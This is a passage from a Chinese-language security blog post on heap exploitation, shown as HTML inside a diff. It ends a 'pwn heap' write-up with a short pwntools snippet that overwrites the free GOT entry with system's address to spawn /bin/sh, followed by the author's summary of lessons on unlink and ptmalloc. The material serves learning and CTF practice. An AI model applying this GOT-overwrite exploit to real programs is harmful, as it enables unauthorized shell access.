+<h5 id="覆写got表"><a href="#覆写got表" class="headerlink" title="覆写got表"></a>覆写got表</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk_head[1] ==&gt; free_got ==&gt; system_addr</span></span><br><span class="line">setchunk(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">12</span> + p32(chunk_head<span class="number">-0xc</span>) + p32(free_got))</span><br><span class="line">setchunk(<span class="number">1</span>, p32(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#system("/bin/sh")</span></span><br><span class="line">delchunk(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<h3 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*。</span></span><br><span class="line"><span class="comment">a.	堆漏洞和栈漏洞的利用是有相通之处的，例如溢出，例如覆盖， 例如。</span></span><br><span class="line"><span class="comment">b.	堆漏洞利用需要一定的对指针的理解，什么时候数据会被写入什么位置</span></span><br><span class="line"><span class="comment">c.	ptmalloc源码的学习，虽然晦涩一些，但确实是会有收获，不然你可能在利用的时候出现各种问题却找不到原因。</span></span><br><span class="line"><span class="comment">d.	unlink是堆漏洞利用的基础，对后续的学习有启发。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+            <a href="../../../../tags/pwn-heap/">pwn heap</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
+    
+    
+</div>
+<script src="../../../../js/busuanzi.pure.mini.js"></script>
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/app" title="App下载">App下载</a>
+        </p>
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+
+    </div>
+</footer>
+<script src="../../../../js/InsightSearch.js"></script>
+<script src="../../../../js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '11/22/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+        });
+    });
+</script>
+</body>
+</html>
